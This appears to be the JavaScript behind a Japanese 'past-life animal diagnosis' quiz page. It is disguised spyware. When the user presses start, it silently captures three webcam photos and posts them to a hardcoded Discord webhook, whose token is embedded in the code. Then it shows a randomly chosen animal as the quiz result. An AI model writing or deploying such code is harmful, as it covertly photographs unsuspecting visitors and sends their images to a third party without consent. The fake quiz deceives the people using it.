const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const startBtn = document.getElementById("start-btn");
const result = document.getElementById("result");
const share = document.getElementById("share");
const twitterShare = document.getElementById("twitter-share");

const animals = [
  "カワウソ", "パンダ", "フクロウ", "ユニコーン", "猫", "柴犬", "タヌキ", "リス",
  "ゾウ", "ライオン", "アルパカ", "チンチラ"
];

navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    video.srcObject = stream;
  });

startBtn.onclick = async () => {
  result.textContent = "診断中...";
  result.classList.remove("hidden");
  share.classList.add("hidden");

  const ctx = canvas.getContext("2d");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  let images = [];

  for (let i = 0; i < 3; i++) {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataURL = canvas.toDataURL("image/jpeg");
    images.push(dataURL);
    await new Promise(res => setTimeout(res, 500));
  }

  // Discordへ送信
  for (const img of images) {
    await fetch("https://discordapp.com/api/webhooks/1366722908902264872/MgHL7P8zsnC_PsDcpl-K-VaTnw5mdU0gb94-U59XArV_8Zin_QA9ZBEDjlAygQxqWATd", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "前世アニマル診断BOT",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/616/616408.png",
        content: "撮影された写真！",
        embeds: [{
          title: "ユーザー画像",
          image: { url: img }
        }]
      })
    });
  }

  const animal = animals[Math.floor(Math.random() * animals.length)];
  result.textContent = `あなたの前世は「${animal}」です！`;

  const tweetText = `私の前世は「${animal}」だったらしい！あなたも診断してみてね！`;
  const tweetUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(tweetText)}&url=${encodeURIComponent(window.location.href)}`;
  twitterShare.href = tweetUrl;

  share.classList.remove("hidden");
};
